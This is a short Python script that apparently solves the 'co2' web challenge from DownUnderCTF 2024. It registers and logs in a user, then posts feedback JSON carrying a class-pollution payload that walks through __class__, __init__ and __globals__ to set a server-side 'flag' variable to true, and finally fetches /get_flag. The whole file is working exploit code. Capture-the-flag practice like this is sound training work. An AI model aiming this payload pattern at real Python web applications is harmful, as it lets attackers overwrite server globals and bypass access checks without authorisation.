from requests import Session

# setting up the paths of the url
base_url = "https://web-co2-19ca2661836e6d89.2024.ductf.dev"
register_url = base_url + "/register"
login_url = base_url + "/login"
save_feedback_url = base_url + "/save_feedback"
get_flag_url = base_url + "/get_flag"

# prototype pollution payload
payload = {
    "title": "test",
    "content": "test",
    "rating": "1",
    "referred": "vein",
    "__class__": {
        "__init__": {
            "__globals__": {
                "flag": "true"
            }
        }
    }
}

register_user = {
    "username": "vein",
    "password": "vein"
}

with Session() as session:
    # step 1: register a user
    r = session.post(register_url, data=register_user)
    print("Register status:", r.status_code)

    # step 2: login
    login_user = register_user
    r = session.post(login_url, data=login_user)
    print("Login status:", r.status_code)

    # just grab the cookie for the session 
    cookies = session.cookies
    print(f"Cookies after login: {cookies}")

    # step 3: submit the payload
    r = session.post(save_feedback_url, json=payload)
    print("Submit payload status:", r.status_code)

    # step 4: get the flag
    r = session.get(get_flag_url)
    print("Get flag status:", r.status_code)
    print("Get flag response:", r.text)